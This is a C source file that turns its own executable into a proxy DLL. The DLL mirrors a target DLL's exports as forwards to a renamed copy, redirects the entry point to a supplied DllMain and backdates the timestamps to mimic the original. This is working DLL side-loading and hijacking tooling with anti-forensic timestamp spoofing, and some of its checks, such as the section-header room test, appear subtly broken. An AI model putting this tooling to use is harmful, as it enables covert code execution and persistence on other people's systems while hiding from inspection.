#include "Headers.h"


/*
// Example Array
static EXPORT_ENTRY g_ExampleExportTable[]     =
{
    { "HelloWorld",  (ULONG_PTR)RunMessageBox,                1,                NULL                     },   // named export
    { "HeapAlloc",   0x00,                                    2,                "NTDLL.RtlAllocateHeap"  },   // named forward
    { NULL,          (ULONG_PTR)RunMessageBox,                3,                NULL                     },   // ordinal-only (#3)
    { "HeapFree",    0x00,                                    1053,             "NTDLL.#1053"            },   // forward by ordinal
    { NULL,          0x00,                                    21,               "NTDLL.#1053"            },   // ordinal-only, forward by ordinal

    { NULL,          0x00,                                    INVALID_ORDINAL,  NULL                     }    // sentinel
};
*/


static DWORD RvaToFileOffset(IN PIMAGE_NT_HEADERS pNtHdrs, IN DWORD dwRva)
{
    PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pNtHdrs);

    for (WORD i = 0; i < pNtHdrs->FileHeader.NumberOfSections; i++, pSection++)
    {
        if (dwRva >= pSection->VirtualAddress && dwRva < pSection->VirtualAddress + pSection->Misc.VirtualSize)
            return (dwRva - pSection->VirtualAddress) + pSection->PointerToRawData;
    }

    return 0x00;
}


static DWORD ComputePECheckSum(IN PVOID pFileBuffer, IN DWORD dwFileSize)
{
    PIMAGE_NT_HEADERS   pNtHdrs         = NULL;
    PWORD               pwWordView      = NULL;
    DWORD               dwWordCount     = 0x00;
    DWORD               dwChkSumIdx     = 0x00;
    ULONGLONG           ullAccumulator  = 0x00;

    if (!pFileBuffer || !dwFileSize)
        return 0x00;

    pNtHdrs = (PIMAGE_NT_HEADERS)((PBYTE)pFileBuffer + ((PIMAGE_DOS_HEADER)pFileBuffer)->e_lfanew);
    if (((PIMAGE_DOS_HEADER)pFileBuffer)->e_magic != IMAGE_DOS_SIGNATURE || pNtHdrs->Signature != IMAGE_NT_SIGNATURE)
    {
        DBG("[!] Invalid PE Headers");
        return 0x00;
    }

    pwWordView  = (PWORD)pFileBuffer;
    dwWordCount = (dwFileSize + 1) / sizeof(WORD);
    dwChkSumIdx = (DWORD)((PBYTE)&pNtHdrs->OptionalHeader.CheckSum - (PBYTE)pFileBuffer) / sizeof(WORD);

    for (DWORD i = 0; i < dwWordCount; i++)
    {
        // Skip the CheckSum Field Itself 
        if (i == dwChkSumIdx || i == dwChkSumIdx + 1)
            continue;

        ullAccumulator = (ullAccumulator & 0xFFFF) + (ullAccumulator >> 16) + pwWordView[i];
    }

    ullAccumulator = (ullAccumulator & 0xFFFF) + (ullAccumulator >> 16);
    return (DWORD)((WORD)ullAccumulator + dwFileSize);
}


static DWORD GetDllTimestamp(IN PVOID pFileBuffer, IN DWORD dwFileSize)
{
    PIMAGE_NT_HEADERS   pNtHdrs     = NULL;
    FILETIME            ft          = { 0 };
    ULARGE_INTEGER      uli         = { 0 };
    DWORD               dwTimeStamp = 0x00;

    if (!pFileBuffer || !dwFileSize)
        return 0x00;

    GetSystemTimeAsFileTime(&ft);

    uli.LowPart  = ft.dwLowDateTime;
    uli.HighPart = ft.dwHighDateTime;
    uli.QuadPart -= 116444736000000000ULL;
    uli.QuadPart /= 10000000ULL;

    pNtHdrs = (PIMAGE_NT_HEADERS)((PBYTE)pFileBuffer + ((PIMAGE_DOS_HEADER)pFileBuffer)->e_lfanew);
    if (((PIMAGE_DOS_HEADER)pFileBuffer)->e_magic != IMAGE_DOS_SIGNATURE || pNtHdrs->Signature != IMAGE_NT_SIGNATURE)
    {
        DBG("[!] Invalid PE Headers");
        return 0x00;
    }

#define SECONDS_PER_DAY     (60 * 60 * 24)
#define DAYS_TO_SECONDS(x)  ((x) * SECONDS_PER_DAY)

    dwTimeStamp = pNtHdrs->FileHeader.TimeDateStamp;
    
    // Make it older by 30 days
    if (dwTimeStamp > (DWORD)uli.QuadPart || dwTimeStamp < DAYS_TO_SECONDS(30))
        dwTimeStamp = (DWORD)uli.QuadPart - DAYS_TO_SECONDS(60);
    else
        dwTimeStamp = dwTimeStamp - DAYS_TO_SECONDS(30);

#undef SECONDS_PER_DAY
#undef DAYS_TO_SECONDS

    return dwTimeStamp;
}


static BOOL BuildExportTableFromDll(IN ULONG_PTR uDllFileBuffer, IN DWORD dwDllFileSize, IN LPCSTR pszCopiedDllName, OUT PEXPORT_ENTRY* ppExportTable, OUT PDWORD pdwExportCount)
{
    PIMAGE_NT_HEADERS       pNtHdrs                     = NULL;
    PIMAGE_EXPORT_DIRECTORY pExportDir                  = NULL;
    PDWORD                  pdwFuncRVAs                 = NULL;
    PDWORD                  pdwNameRVAs                 = NULL;
    PWORD                   pwNameOrdinals              = NULL;
    ULONG_PTR               uBlobBuffer                 = 0x00;
    PEXPORT_ENTRY           pEntries                    = NULL;
    PBYTE                   pStrings                    = NULL;
    CHAR                    szModulePrefix[MAX_PATH]    = { 0 };
    CHAR                    szForwardBuf[MAX_PATH]      = { 0 };
    DWORD                   dwActualCount               = 0x00,
                            dwTotalStringSize           = 0x00,
                            dwStringOffset              = 0x00,
                            dwEntryIdx                  = 0x00;
    HRESULT                 hResult                     = S_OK;
    BOOL                    bResult                     = FALSE;

    if (!uDllFileBuffer || !dwDllFileSize || !pszCopiedDllName || !ppExportTable || !pdwExportCount)
        return FALSE;

    pNtHdrs = (PIMAGE_NT_HEADERS)(uDllFileBuffer + ((PIMAGE_DOS_HEADER)uDllFileBuffer)->e_lfanew);
    if (((PIMAGE_DOS_HEADER)uDllFileBuffer)->e_magic != IMAGE_DOS_SIGNATURE || pNtHdrs->Signature != IMAGE_NT_SIGNATURE)
    {
        DBG("[!] Invalid PE Headers");
        goto _END_OF_FUNC;
    }

    if (!pNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress)
    {
        DBG("[!] No Export Directory Found In The Provided DLL Buffer");
        goto _END_OF_FUNC;
    }

    // Resolve the Array of RVAs, Array of Names, Array of Ordinals Using 'RvaToFileOffset'
    pExportDir      = (PIMAGE_EXPORT_DIRECTORY)(uDllFileBuffer + RvaToFileOffset(pNtHdrs, pNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress));
    pdwFuncRVAs     = (PDWORD)(uDllFileBuffer + RvaToFileOffset(pNtHdrs, pExportDir->AddressOfFunctions));
    pdwNameRVAs     = (PDWORD)(uDllFileBuffer + RvaToFileOffset(pNtHdrs, pExportDir->AddressOfNames));
    pwNameOrdinals  = (PWORD) (uDllFileBuffer + RvaToFileOffset(pNtHdrs, pExportDir->AddressOfNameOrdinals));

    // Build forward module prefix from the copied DLL name ("dspatial.dll" -> "DSPATIAL")
    // This prefix is prepended to every forwarded export string ("DSPATIAL.FuncName" / "DSPATIAL.#7")
    if (FAILED((hResult = StringCchCopyA(szModulePrefix, ARRAYSIZE(szModulePrefix), pszCopiedDllName))))
    {
        DBG_HEX_ERROR("StringCchCopyA", hResult);
        goto _END_OF_FUNC;
    }

    PathRemoveExtensionA(szModulePrefix);
    CharUpperA(szModulePrefix);

    // First pass (dry run): To count non-empty slots and total string size needed for the blob
    for (DWORD i = 0; i < pExportDir->NumberOfFunctions; i++)
    {
        if (!pdwFuncRVAs[i])
            continue;

        WORD    wOrdinal    = (WORD)(pExportDir->Base + i);
        LPCSTR  pszName     = NULL;

        // Walk the name table to find a name for this ordinal index if any. 
        // If not, we use the ordinal
        for (DWORD j = 0; j < pExportDir->NumberOfNames; j++)
        {
            if (pwNameOrdinals[j] == i)
            {
                pszName = (LPCSTR)(uDllFileBuffer + RvaToFileOffset(pNtHdrs, pdwNameRVAs[j]));
                break;
            }
        }

        if (pszName)
        {
            // Forward string: "MODULE.Name" (exported by name)
            dwTotalStringSize += (DWORD)lstrlenA(pszName) + 1;
            dwTotalStringSize += (DWORD)lstrlenA(szModulePrefix) + 1 + (DWORD)lstrlenA(pszName) + 1;
        }
        else
        {
            // Forward string: "MODULE.#N" (exported by ordinal)
            wsprintfA(szForwardBuf, "%s.#%u", szModulePrefix, wOrdinal);
            dwTotalStringSize += (DWORD)lstrlenA(szForwardBuf) + 1;
        }

        dwActualCount++;
    }

    if (!dwActualCount)
    {
        DBG("[!] No Export Directory Found In The Provided DLL Buffer");
        goto _END_OF_FUNC;
    }

    // Allocate a single blob:
    //   [ EXPORT_ENTRY * (dwActualCount + 1)    ]    +1 for the sentinel terminator entry
    //   [ String Pool:  dwTotalStringSize bytes ]    
    HEAP_ALLOC(uBlobBuffer, ((dwActualCount + 1) * sizeof(EXPORT_ENTRY) + dwTotalStringSize));
    if (!uBlobBuffer)
        goto _END_OF_FUNC;

    pEntries = (PEXPORT_ENTRY)uBlobBuffer;
    pStrings = (PBYTE)(uBlobBuffer + (dwActualCount + 1) * sizeof(EXPORT_ENTRY));

    // Second pass: Write EXPORT_ENTRY structs and pack strings into thje allocated blob
    for (DWORD i = 0; i < pExportDir->NumberOfFunctions; i++)
    {
        if (!pdwFuncRVAs[i])
            continue;

        WORD    wOrdinal    = (WORD)(pExportDir->Base + i);
        LPCSTR  pszName     = NULL;
        DWORD   dwLen       = 0x00;

        for (DWORD j = 0; j < pExportDir->NumberOfNames; j++)
        {
            if (pwNameOrdinals[j] == i)
            {
                pszName = (LPCSTR)(uDllFileBuffer + RvaToFileOffset(pNtHdrs, pdwNameRVAs[j]));
                break;
            }
        }

        pEntries[dwEntryIdx].uFuncAddress = 0x00;
        pEntries[dwEntryIdx].wOrdinal     = wOrdinal;

        // Build "MODULE.Name" forward string
        if (pszName)
        {
            dwLen = (DWORD)lstrlenA(pszName) + 1;
            RtlCopyMemory(pStrings + dwStringOffset, pszName, dwLen);
            pEntries[dwEntryIdx].pszName = (LPCSTR)(pStrings + dwStringOffset);
            dwStringOffset += dwLen;

            wsprintfA(szForwardBuf, "%s.%s", szModulePrefix, pszName);
            dwLen = (DWORD)lstrlenA(szForwardBuf) + 1;
            RtlCopyMemory(pStrings + dwStringOffset, szForwardBuf, dwLen);
            pEntries[dwEntryIdx].pszForward = (LPCSTR)(pStrings + dwStringOffset);
            dwStringOffset += dwLen;
        }
        // Build "MODULE.#N" forward string
        else
        {
            pEntries[dwEntryIdx].pszName = NULL;

            wsprintfA(szForwardBuf, "%s.#%u", szModulePrefix, wOrdinal);
            dwLen = (DWORD)lstrlenA(szForwardBuf) + 1;
            RtlCopyMemory(pStrings + dwStringOffset, szForwardBuf, dwLen);
            pEntries[dwEntryIdx].pszForward = (LPCSTR)(pStrings + dwStringOffset);
            dwStringOffset += dwLen;
        }

        /*
        DBG("[dbg] Export Built | %-30s | Forward: %s | Ordinal: %u",
            pEntries[dwEntryIdx].pszName ? pEntries[dwEntryIdx].pszName : "<ordinal-only>",
            pEntries[dwEntryIdx].pszForward,
            wOrdinal);
        */

        dwEntryIdx++;
    }

    // Sentinel to mark the end of the table
    pEntries[dwActualCount].pszName      = NULL;
    pEntries[dwActualCount].uFuncAddress = 0x00;
    pEntries[dwActualCount].wOrdinal     = INVALID_ORDINAL;
    pEntries[dwActualCount].pszForward   = NULL;

    *ppExportTable  = pEntries;
    *pdwExportCount = dwActualCount;

    bResult = TRUE;

_END_OF_FUNC:
    if (!bResult)
        HEAP_FREE(uBlobBuffer);
    return bResult;
}


static BOOL PatchExportAddressTable(IN OUT PULONG_PTR puFileBuffer, IN OUT PDWORD pdwFileSize, IN LPCSTR pszDllName, IN PEXPORT_ENTRY pExportTable, IN DWORD dwExportCount, IN DWORD dwTimeDateStamp)
{
    PIMAGE_NT_HEADERS       pNtHdrs         = NULL;
    PIMAGE_SECTION_HEADER   pNewSection     = NULL;
    PIMAGE_EXPORT_DIRECTORY pExportDir      = NULL;
    ULONG_PTR               uModule         = 0x00;
    ULONG_PTR               uNewBuffer      = 0x00;
    PBYTE                   pBlob           = NULL;
    PDWORD                  pdwFuncRVAs     = NULL;
    PDWORD                  pdwNameRVAs     = NULL;
    PWORD                   pwOrdinals      = NULL;
    DWORD                   dwNameIdx       = 0x00,
                            dwNumExports    = 0x00,
                            dwNumNames      = 0x00,
                            dwNumFuncSlots  = 0x00,
                            dwSectionVA     = 0x00,
                            dwSectionRaw    = 0x00,
                            dwSectionAlign  = 0x00,
                            dwFileAlign     = 0x00,
                            dwNewFileSize   = 0x00,
                            dwBlobSize      = 0x00,
                            dwOffExpDir     = 0x00,
                            dwOffFuncRVAs   = 0x00,
                            dwOffNameRVAs   = 0x00,
                            dwOffOrdinals   = 0x00,
                            dwOffDllName    = 0x00,
                            dwOffNames      = 0x00,
                            dwOffForwards   = 0x00;
    BOOL                    bResult         = FALSE;

    if (!puFileBuffer || !pdwFileSize || !pszDllName || !pExportTable || !dwExportCount)
        return FALSE;

    // Needed later to convert absolute function addresses to image-relative RVAs
    uModule = (ULONG_PTR)GetModuleHandle(NULL);

    // Count exports, named entries, and the highest ordinal to correctly size the sparse FuncRVA table
    while (dwNumExports < dwExportCount && pExportTable[dwNumExports].wOrdinal != INVALID_ORDINAL)
    {
        if (pExportTable[dwNumExports].pszName != NULL)
            dwNumNames++;

        // FuncRVA table is ordinal-indexed and sparse
        // Its slot count equals the highest ordinal value, not the export count
        if ((DWORD)pExportTable[dwNumExports].wOrdinal + 1 > dwNumFuncSlots)
            dwNumFuncSlots = (DWORD)pExportTable[dwNumExports].wOrdinal;

        dwNumExports++;
    }

    if (dwNumExports == 0)
    {
        DBG("[!] Export Table Is Empty");
        return FALSE;
    }

    /*
    DBG("[dbg] %u Export(s) | %u Named | %u Ordinal-Only | %u FuncRVA Slot(s)", dwNumExports, dwNumNames, dwNumExports - dwNumNames, dwNumFuncSlots);
    */

    pNtHdrs = (PIMAGE_NT_HEADERS)(*puFileBuffer + ((PIMAGE_DOS_HEADER)*puFileBuffer)->e_lfanew);
    if (((PIMAGE_DOS_HEADER)*puFileBuffer)->e_magic != IMAGE_DOS_SIGNATURE || pNtHdrs->Signature != IMAGE_NT_SIGNATURE)
    {
        DBG("[!] Invalid PE Headers");
        return FALSE;
    }

    // Verify there is room in the headers region for one additional section header entry before we start working
    if ((DWORD)((PBYTE)(pNewSection + 1) - (PBYTE)uNewBuffer) > pNtHdrs->OptionalHeader.SizeOfHeaders)
    {
        DBG("[!] No Room For New Section Header (Required: 0x%08X | Available: 0x%08X)",
            (DWORD)((PBYTE)(pNewSection + 1) - (PBYTE)*puFileBuffer), pNtHdrs->OptionalHeader.SizeOfHeaders);
        return FALSE;
    }

    dwSectionAlign  = pNtHdrs->OptionalHeader.SectionAlignment;
    dwFileAlign     = pNtHdrs->OptionalHeader.FileAlignment;

    // New section is placed after the last existing section, aligned to both section and file alignment
    {
        PIMAGE_SECTION_HEADER pLastSection = IMAGE_FIRST_SECTION(pNtHdrs) + (pNtHdrs->FileHeader.NumberOfSections - 1);
        dwSectionVA  = ALIGN_UP(pLastSection->VirtualAddress + pLastSection->Misc.VirtualSize, dwSectionAlign);
        dwSectionRaw = ALIGN_UP(*pdwFileSize, dwFileAlign);
        /*
        DBG("[dbg] New Section | VA: 0x%08X | FileOffset: 0x%08X", dwSectionVA, dwSectionRaw);
        */
    }

    // ----------------------------------------------------------------------------------------------
    // Compute blob-relative offsets for each sub-region of the export section.
    //
    // Blob layout (all offsets are relative to the start of the new section):
    //
    //   [0x00] IMAGE_EXPORT_DIRECTORY      (fixed size)
    //   [+sizeof(EXPDIR)] FuncRVAs[]       (4 * dwNumFuncSlots — sparse, ordinal-indexed EAT)
    //   [+...] NameRVAs[]                  (4 * dwNumNames — RVAs into the name string pool)
    //   [+...] Ordinals[]                  (2 * dwNumNames — EONT, WORD-sized, DWORD-padded)
    //   [+...] DLL name string             (null-terminated)
    //   [+...] Export name strings         (one per named export, null-terminated)
    //   [+...] Forward strings             (one per forwarded export, after all name strings)
    // ----------------------------------------------------------------------------------------------

    dwOffExpDir     = 0x00;
    dwOffFuncRVAs   = dwOffExpDir + sizeof(IMAGE_EXPORT_DIRECTORY);
    dwOffNameRVAs   = dwOffFuncRVAs + dwNumFuncSlots * sizeof(DWORD);
    dwOffOrdinals   = dwOffNameRVAs + dwNumNames * sizeof(DWORD);
    dwOffDllName    = ALIGN_UP(dwOffOrdinals + dwNumNames * sizeof(WORD), sizeof(DWORD)); // pad to DWORD boundary before placing the DLL name 
    dwOffNames      = dwOffDllName + (DWORD)lstrlenA(pszDllName) + 1;

    // Walk the table once to accumulate the variable-length name and forward string sizes
    dwBlobSize = dwOffNames;
    for (DWORD i = 0; i < dwNumExports; i++)
    {
        if (pExportTable[i].pszName    != NULL) dwBlobSize += (DWORD)lstrlenA(pExportTable[i].pszName)    + 1;
        if (pExportTable[i].pszForward != NULL) dwBlobSize += (DWORD)lstrlenA(pExportTable[i].pszForward) + 1;
    }


    // Allocate a new buffer large enough for the original file data plus the aligned export section
    dwNewFileSize = dwSectionRaw + ALIGN_UP(dwBlobSize, dwFileAlign);
    HEAP_ALLOC(uNewBuffer, dwNewFileSize);
    if (!uNewBuffer) return FALSE;

    RtlCopyMemory((PVOID)uNewBuffer, (PVOID)*puFileBuffer, *pdwFileSize);
    HEAP_FREE(*puFileBuffer);

    // Re-derive NT headers pointer after reallocation  
    pNtHdrs = (PIMAGE_NT_HEADERS)(uNewBuffer + ((PIMAGE_DOS_HEADER)uNewBuffer)->e_lfanew);
    pBlob   = (PBYTE)(uNewBuffer + dwSectionRaw);

    // Fill IMAGE_EXPORT_DIRECTORY.
    // All address fields are VAs relative to the section base (not file offsets)
    pExportDir                          = (PIMAGE_EXPORT_DIRECTORY)(pBlob + dwOffExpDir);
    pExportDir->Name                    = dwSectionVA + dwOffDllName;
    pExportDir->Base                    = 0x01; // ordinals are 1-based
    pExportDir->TimeDateStamp           = dwTimeDateStamp;
    pExportDir->NumberOfFunctions       = dwNumFuncSlots;
    pExportDir->NumberOfNames           = dwNumNames;
    pExportDir->AddressOfFunctions      = dwSectionVA + dwOffFuncRVAs;
    pExportDir->AddressOfNames          = dwSectionVA + dwOffNameRVAs;
    pExportDir->AddressOfNameOrdinals   = dwSectionVA + dwOffOrdinals;

    pdwFuncRVAs = (PDWORD)(pBlob + dwOffFuncRVAs);
    pdwNameRVAs = (PDWORD)(pBlob + dwOffNameRVAs);
    pwOrdinals  = (PWORD )(pBlob + dwOffOrdinals);

    RtlCopyMemory(pBlob + dwOffDllName, pszDllName, lstrlenA(pszDllName) + 1);

    // Pre-compute where forward strings begin inside the blob
    dwOffForwards = dwOffNames;
    for (DWORD i = 0; i < dwNumExports; i++)
    {
        if (pExportTable[i].pszName != NULL) dwOffForwards += (DWORD)lstrlenA(pExportTable[i].pszName) + 1;
    }

    // Main Loop
    for (DWORD i = 0; i < dwNumExports; i++)
    {
        PEXPORT_ENTRY   pEntry      = &pExportTable[i];
        DWORD           dwStrSize   = 0x00;

        if (pEntry->pszForward != NULL)
        {
            // For a forwarded export, the FuncRVA slot holds the VA of the forward string (not a function code RVA)
            pdwFuncRVAs[pEntry->wOrdinal - pExportDir->Base] = dwSectionVA + dwOffForwards;

            dwStrSize = (DWORD)lstrlenA(pEntry->pszForward) + 1;
            RtlCopyMemory(pBlob + dwOffForwards, pEntry->pszForward, dwStrSize);
            dwOffForwards += dwStrSize;
        }
        else
        {
            // For a real export, store the function's RVA relative to the module base
            // NOTE:
            // This branch is never executed in this project because we use this function with a table 
            // built by 'BuildExportTableFromDll', which produces only forwarded functions.
            // For comparison, check out the commented 'g_ExampleExportTable' variable where we have all types of functions
            pdwFuncRVAs[pEntry->wOrdinal - pExportDir->Base] = (DWORD)(pEntry->uFuncAddress - uModule);
        }

        if (pEntry->pszName != NULL)
        {
            // NameRVAs and Ordinals arrays are parallel 
            // pdwNameRVAs[k] is the RVA of the name string whose ordinal index is pwOrdinals[k].
            // dwNameIdx links the two
            pdwNameRVAs[dwNameIdx]  = dwSectionVA + dwOffNames;
            pwOrdinals[dwNameIdx]   = (WORD)(pEntry->wOrdinal - pExportDir->Base);
            dwNameIdx++;

            dwStrSize = (DWORD)lstrlenA(pEntry->pszName) + 1;
            RtlCopyMemory(pBlob + dwOffNames, pEntry->pszName, dwStrSize);
            dwOffNames += dwStrSize;

            if (pEntry->pszForward != NULL)
                DBG("[+] Export[%u] | %-30s | Forward To: %-30s | Ordinal: %u", i, pEntry->pszName, pEntry->pszForward, pEntry->wOrdinal);
            else
                DBG("[+] Export[%u] | %-30s | RVA: 0x%08X | Ordinal: %u", i, pEntry->pszName, pdwFuncRVAs[pEntry->wOrdinal], pEntry->wOrdinal);
        }
        else
        {
            if (pEntry->pszForward != NULL)
                DBG("[+] Export[%u] | <ordinal-only> | Forward To: %-30s | Ordinal: %u", i, pEntry->pszForward, pEntry->wOrdinal);
            else
                DBG("[+] Export[%u] | <ordinal-only> | RVA: 0x%08X | Ordinal: %u", i, pdwFuncRVAs[pEntry->wOrdinal], pEntry->wOrdinal);
        }
    }

    // AddressOfNames must be sorted ascending (so that the PE loader's binary search logic work)
    if (dwNumNames > 1)
    {
        for (DWORD i = 0; i < dwNumNames - 1; i++)
        {
            for (DWORD j = i + 1; j < dwNumNames; j++)
            {
                // Resolve both name RVAs back to their string pointers for comparison
                LPCSTR pszA = (LPCSTR)(uNewBuffer + dwSectionRaw + (pdwNameRVAs[i] - dwSectionVA));
                LPCSTR pszB = (LPCSTR)(uNewBuffer + dwSectionRaw + (pdwNameRVAs[j] - dwSectionVA));

                if (lstrcmpA(pszA, pszB) > 0)
                {
                    // Swap both the name RVA and its paired ordinal to keep the two arrays in sync
                    DWORD dwTmp = pdwNameRVAs[i];
                    pdwNameRVAs[i] = pdwNameRVAs[j];
                    pdwNameRVAs[j] = dwTmp;

                    WORD  wTmp = pwOrdinals[i];
                    pwOrdinals[i] = pwOrdinals[j];
                    pwOrdinals[j] = wTmp;
                }
            }
        }
    }

    // Append a new section header for the export blob (".edata")
    pNewSection = IMAGE_FIRST_SECTION(pNtHdrs) + pNtHdrs->FileHeader.NumberOfSections;

    RtlSecureZeroMemory(pNewSection, sizeof(IMAGE_SECTION_HEADER));

    // Populate the new section's data
    RtlCopyMemory(pNewSection->Name, EDATA_SECTION_NAME, sizeof(EDATA_SECTION_NAME) - 1);
    pNewSection->Misc.VirtualSize   = dwBlobSize;                           // actual data size
    pNewSection->VirtualAddress     = dwSectionVA;
    pNewSection->SizeOfRawData      = ALIGN_UP(dwBlobSize, dwFileAlign);    // padded data size
    pNewSection->PointerToRawData   = dwSectionRaw;
    pNewSection->Characteristics    = IMAGE_SCN_MEM_READ | IMAGE_SCN_CNT_INITIALIZED_DATA;

    // Add the new section to the headers
    pNtHdrs->FileHeader.NumberOfSections++;
    pNtHdrs->FileHeader.TimeDateStamp                                                   = dwTimeDateStamp;
    pNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress  = dwSectionVA;
    pNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size            = dwBlobSize;
    // SizeOfImage should be rounded up to SectionAlignment 
    pNtHdrs->OptionalHeader.SizeOfImage                                                 = dwSectionVA + ALIGN_UP(dwBlobSize, dwSectionAlign);
    pNtHdrs->OptionalHeader.CheckSum                                                    = ComputePECheckSum((PVOID)uNewBuffer, dwNewFileSize);

    DBG("[+] NT Headers Patched | SizeOfImage: 0x%08X | Export VA: 0x%08X | CheckSum: 0x%08X",
        pNtHdrs->OptionalHeader.SizeOfImage, dwSectionVA, pNtHdrs->OptionalHeader.CheckSum);

    *puFileBuffer   = uNewBuffer;
    *pdwFileSize    = dwNewFileSize;
    bResult         = TRUE;

_END_OF_FUNC:
    if (!bResult)
        HEAP_FREE(uNewBuffer);
    return bResult;
}


BOOL ConvertExecutableToDll(IN LPCSTR pszOriginalDllPath, IN LPCSTR pszCopiedDllName, IN ULONG_PTR uDllMain, OUT PBYTE* ppDllBuffer, OUT DWORD* pdwDllFileSize)
{
    WCHAR               wszExePath[MAX_PATH]    = { 0 };
    PBYTE               pOriginalDllBuffer      = NULL;
    DWORD               dwOriginalDllSize       = 0x00;
    PEXPORT_ENTRY       pExportTable            = NULL;
    DWORD               dwExportCount           = 0x00;
    DWORD               dwDllMainRva            = 0x00;
    DWORD               dwOriginalDllTimeStamp  = 0x00;
    ULONG_PTR           uFileBuffer             = 0x00;
    HMODULE             hCurrentModule          = NULL;
    DWORD               dwFileSize              = 0x00;
    PIMAGE_NT_HEADERS   pImgNtHdrs              = NULL;
    LPWSTR              pwszOriginalDllPath     = NULL;

    if (!ppDllBuffer || !pdwDllFileSize || !uDllMain || !pszOriginalDllPath || !pszCopiedDllName)
        return FALSE;

    *ppDllBuffer    = NULL;
    *pdwDllFileSize = 0x00;

    hCurrentModule = GetModuleHandle(NULL);

    // Calculate DllMain's RVA is to set as the DLL entry point after patching
    dwDllMainRva = (DWORD)(uDllMain - (ULONG_PTR)hCurrentModule);

    // Read self executable from disk
    if (GetModuleFileNameW(hCurrentModule, wszExePath, MAX_PATH) == 0)
    {
        DBG_LAST_ERROR("GetModuleFileNameW");
        goto _END_OF_FUNC;
    }

    if (!ReadFileFromDiskW(wszExePath, (PBYTE*)&uFileBuffer, &dwFileSize))
        goto _END_OF_FUNC;

    pImgNtHdrs = (PIMAGE_NT_HEADERS)(uFileBuffer + ((PIMAGE_DOS_HEADER)uFileBuffer)->e_lfanew);
    if (((PIMAGE_DOS_HEADER)uFileBuffer)->e_magic != IMAGE_DOS_SIGNATURE || pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)
    {
        DBG("[!] Invalid PE Headers");
        goto _END_OF_FUNC;
    }

    // Flip the DLL characteristic bit and redirect the entry point to DllMain
    pImgNtHdrs->FileHeader.Characteristics          |= IMAGE_FILE_DLL;
    pImgNtHdrs->OptionalHeader.AddressOfEntryPoint  = dwDllMainRva;
    pImgNtHdrs->OptionalHeader.Subsystem            = IMAGE_SUBSYSTEM_WINDOWS_GUI;

    // Read the original DLL. Required by GetDllTimestamp and BuildExportTableFromDll
    if (!(pwszOriginalDllPath = (LPWSTR)ConvertString((LPVOID)pszOriginalDllPath, lstrlenA(pszOriginalDllPath), ENCODING_ANSI_TO_WIDE)))
        goto _END_OF_FUNC;

    if (!ReadFileFromDiskW(pwszOriginalDllPath, &pOriginalDllBuffer, &dwOriginalDllSize))
    {
        DBG("[!] Failed To Read Original DLL: %s", pszOriginalDllPath);
        HEAP_FREE(pwszOriginalDllPath);
        goto _END_OF_FUNC;
    }

    HEAP_FREE(pwszOriginalDllPath);
    
    // Get a 30 days older timestamp than the original DLL or 60 days older than now
    dwOriginalDllTimeStamp = GetDllTimestamp(pOriginalDllBuffer, dwOriginalDllSize);

    // Build a forwarded export table that mirrors the original DLL's exports.
    if (!BuildExportTableFromDll((ULONG_PTR)pOriginalDllBuffer, dwOriginalDllSize, pszCopiedDllName, &pExportTable, &dwExportCount))
    {
        DBG("[!] Failed To Build Export Table From: %s", pszOriginalDllPath);
        goto _END_OF_FUNC;
    }
     
    // Linker always emits a 'coffgrp' debug entry regardless of debug settings.
    // So we patch it to match the export table and nt headers
    {
        DWORD dwDbgDirRva = pImgNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_DEBUG].VirtualAddress;
        if (dwDbgDirRva)
        {
            PIMAGE_DEBUG_DIRECTORY  pDebugDir   = (PIMAGE_DEBUG_DIRECTORY)(uFileBuffer + RvaToFileOffset(pImgNtHdrs, dwDbgDirRva));
            DWORD                   dwDbgCount  = pImgNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_DEBUG].Size / sizeof(IMAGE_DEBUG_DIRECTORY);

            for (DWORD i = 0; i < dwDbgCount; i++)
                pDebugDir[i].TimeDateStamp = dwOriginalDllTimeStamp;
        }
    }

    // Append a new ".edata" section to the PE buffer and populate it with the forwarded export directory built using BuildExportTableFromDll
    if (!PatchExportAddressTable(&uFileBuffer, &dwFileSize, PathFindFileNameA(pszOriginalDllPath), pExportTable, dwExportCount, dwOriginalDllTimeStamp))
        goto _END_OF_FUNC;

    *ppDllBuffer            = (PBYTE)uFileBuffer;
    *pdwDllFileSize         = dwFileSize;

_END_OF_FUNC:
    HEAP_FREE(pOriginalDllBuffer);
    HEAP_FREE(pExportTable);
    if (!*ppDllBuffer)
        HEAP_FREE(uFileBuffer);
    return *ppDllBuffer ? TRUE : FALSE;
}

